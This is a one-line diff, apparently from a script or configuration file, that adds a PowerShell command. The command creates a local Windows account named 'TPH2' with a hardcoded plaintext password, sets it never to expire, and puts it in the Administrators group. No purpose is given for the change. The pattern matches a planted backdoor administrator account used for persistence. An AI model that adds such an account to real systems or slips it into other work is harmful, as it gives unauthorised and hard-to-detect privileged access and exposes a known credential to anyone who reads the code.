@@ -1,0 +1,1 @@
+ New-LocalUser -AccountNeverExpires:$true -Password ( ConvertTo-SecureString -AsPlainText -Force '1923Host!') -Name 'TPH2' | Add-LocalGroupMember -Group administrators
